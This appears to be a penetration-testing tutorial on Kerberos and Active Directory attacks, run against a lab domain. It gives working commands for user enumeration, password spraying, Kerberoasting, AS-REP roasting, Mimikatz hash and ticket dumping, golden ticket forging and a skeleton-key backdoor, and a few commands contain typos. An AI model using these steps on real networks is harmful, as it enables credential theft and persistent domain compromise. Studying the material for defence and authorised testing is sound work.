Post-Exploitation is one of the last phase of Penetration Testing where an attacker try to clear the logs and maintain a backdoor
into the system. However, We will be exploring the part of exploitation where we will be gaining access to the network of the user
by using some of the methods given below:

First,Let's have a basic understanding of an authentication service of Active Directory.

What is Kerberos?
-----------------
- Kerberos is the default authentication service for microsoft windows domain. It is intended to be more secure than NTLM by using 
third party ticket authorization as well as strong encryption. 
Common Terminology:

- Ticket Granting Ticket(TGT) : A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for 
specific resources from the domain.
- Key Distribution Center(KDC) : The Key Distribution Center is a service for issuing TGT's and service tickets that consist of the 
Authentication service and Ticket Granting Service
- Authentication Service(AS) : The Authentication Service issues TGTs to be used by TGS in the domain to request access to other machines
and service tickets.
- Ticket Granting service(TGS) : The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
- Service Principal Name(SPN) : A Service Principal Name is an identifier given to a service instance to associate a service instance with a 
domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- KDC Long Term Secret Key(KDC LT Key) : It is based on KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- Client Long term secret key(Client LT key) : It is based on computer or service account. It is used to check the encrypted timestamp
and encrypt the session key.
- Service Long term secret key(Service LT key) : It is based on service account. It is used to encrypt the service portion of the service
and sign the PAC
- Session Key : Issued by KDC when a TGT is issued. The user will provide a session key to the KDC along with TGT when requesting a service ticket
- Privilege Attribute Certificate(PAC) : The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed
by the Target LT key and the KDC LT key in order to validate the user.


AS-REQ w/Pre-Authentication 
----------------------------
- The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT
for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The
KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

Kerberos Authentication Overview
--------------------------------

AS-REQ - 1.) The Client requests an Authentication Ticket or Ticket Granting Ticket(TGT)
AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT
TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server(TGS) with the Service Principal Names(SPN) of the service the client 
wants to access
TGS-REP - 4.) The Key Distribution Center(KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid 
session key for the service to the client.
AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access
AP-REP - 6.) The service grants access.

Kerberos Tickets Overview
-------------------------
- The main ticket that you will see is a ticket-granting ticket thse can come in various forms such as .kirbi for Rubeus .ccache for Impacket.The main
ticket that we will see is .kirbi ticket. It is typically base64 encoded and can be used for various attacks.

Attack Privilege Requirements
-----------------------------
- Kerbrute Enumeration : No domain access required
- Pass the ticket : Access as a user to the domain required
- Kerberoasting : Access as any user required
- AS-REP Roasting : Access as any user required
- Golden Ticket : Full domain compromise(domain admin) required
- Silver Ticket : Service hash required
- Skeleton Key : Full domain compromise(domain admin) required

Enumeration
===========
-> Enumeration is one of the basic approach used by an attacker before attacking any target because a better understanding of the target
system will help us easily control the target system. Some of the tools used for enumerating the domain are:

i. PowerView
-------------
- Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already 
gained a shell in the system. 

shell> powershell -ep bypass
- Bypass the execution policy of powershell allowing us to easily run the scripts

shell> . .\PowerView.ps1
- Start PowerView

shell> Get-NetUser | select cn
- Enumerate the domain users

shell> Get-NetGroup -GroupName *admin*
- Enumerate the domain groups

ii. BloodHound
---------------
- Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with Sharphound which is similar 
to PowerView takes the users, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound. We'll
be focusing on how to collect the .json files and how to import them into Bloodhound.

Bloodhound installation:
#apt-get install bloodhound
#neo4j console - default credentials neo4j:neo4j

Getting Loot with SharpHound
shell> powershell -ep bypass
shell> .\SharpHound.ps1
shell>Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
Transfer the zip file into our attacker machine using scp

Mapping the network with BloodHound
$ bloodhound
Sign in using same credentials with Neo4j
Import the loot.zip folder in bloodhound
Go to queries and run the predefined queries from it.


iii. Kerbrute
-------------
- Kerbrute is a popular enumeration tool used for brute-force and enumerate valid active-directory users by abusing the kerberos
pre-authentication. 

Abusing Pre-Authentication Overview
-----------------------------------
By brute-forcing kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to 
blue teams. when brute-forcing through kerberos you can brute-force by sending a single UDP frame to the KDC(Key Domain Controller)
allowing you to enumerate the users on domain from a wordlist.

# Install Kerbrute
#./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local user.txt

Note : CONTROLLER.local is to be listed in /etc/hosts along with machine ip
 --dc is domain controller
 -d is domain name 
 user.txt is wordlist


Exploitation
============
-> In this phase, we will using various methods and tools for attacking an Active Directory. 

i. Rubeus
---------
- Harvesting and Brute-forcing Tickets with Rubeus : Rubeus is a powerful tool for attacking kerberos. Rubeus has a wide variety of attacks
and features that allow it to be very versatile tool for attacking kerberos. Just some of the many tools and attacks includes overpass
the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting and Kerberoasting

To harvest TGT every 30 seconds
shell> Rubeus.exe harvest /interval:30

- Brute-forcing/Password-Spraying with Rubeus: Rubeus can both brute force passwords as well as password spray user accounts. In password spraying,
a single password is reused for every user accounts. 
Add the IP to hosts file:
echo MACHINE_IP CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

Spray the "Password1" to all users account
shell> Rubeus.exe brute /password:Password1 /noticket


- Kerberoasting With Rubeus: Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to 
crack the service password. If the service has a registered SPN then it can be trackable as well as the privileges of the cracked service account. To 
enumerate kerberoastable accounts, we can use bloodhound.
shell> rubeus.exe kerberoast
Copy the hash file and crack it using hashcat
$ hashcat -m 13100 -a 0 hash.txt Pass.txt

- Kerberoasting with Impacket: 
$ cd /usr/share/doc/python3-impacket/examples/
$ sudo python3 GetUsersSPNs.py controller.local/Machine1:Password1 -dc -ip <machine ip> -request
$ hashcat -m 13100 -a 0 hash.txt pass.txt

- AS-REP Roasting with Rubeus: Very similar to kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have
Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP 
roast a user must have pre-authentication disabled. During pre-authentication, the users hash will be used to encrypt a timestamp that
the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After 
validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data
for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user
is really who they say that they are:
shell> Rubeus.exe asreproast
This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
Cracking hashes
$ hashcat -m 18200 hash.txt pass.txt

ii. Mimikatz
-------------
- Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping the user credentials inside of an active directory network.

- Dump hashes with mimikatz
shell> mimikatz.exe
mz> privilege::debug
This ensures user is an administrator
mz> lsadump::lsa /patch
Dump the hashes
$hashcat -m 1000 <hash> rockyou.txt
  Crack those hashes
  
- Pass the ticket 
Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service(LSASS)
is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the 
gatekeeper and accept or reject the credentials provided. We can dump the Kerberos Tickets from the LSASS memory just like we dump the hashes.
It is very beneficial in lateral movement or privilege escalation attacks.

mz> privilege::debug
mz> sekurlsa::tickets /export
To export all .kirbi tickets into current working directory

mz>kerberos:ptt <ticket>
shell> klist
  To verify whether we successfully impersonated the ticket by listing our cached tickets
  
- Golden/Silver ticket attacks
In order to fully understand how these attacks work you need to understand the difference between KRBTGT and a TGT. A KRBTGT is the service
account for the KDC this is the KDC that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket 
form the KRBTGT you give yourself ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the
KDC and can only access that service the TGT is from like the SQLService ticket.

mz> privilege::debug
mz>lsadump::lsa /inject /name:krbtgt
This dumps the hash and security identifier of the Kerberos Ticket granting ticket account allowing you to create a golden ticket 
Take a note of sid and NTLM hash

mz> kerberos::golden /user:administrator /domain:controller.local /sid:<above sid> krbtgt:<NTLM obtained from above> /id:500
mz> misc::cmd

- Kerberos Backdoors w/ mimikatz:
Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of domain forest
allowing itself access to any of the machines with a master password.
The skeleton key works by abusing the AS-REQ encrypted timestamps. The dc then tries to decrypt this timestamp with the users NT hash, once a 
skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT
hash allowing you access to the domain forest
mz> misc::skeleton
It will install the skeleton

Accessing the forest
the default credentials will be mimikatz
shell> net use C:\\DOMAIN-CONTROLLER\admin$ /user:administrator mimikatz
shell> dir \\Desktop-1\c$ /user:Machine1 mimikatz



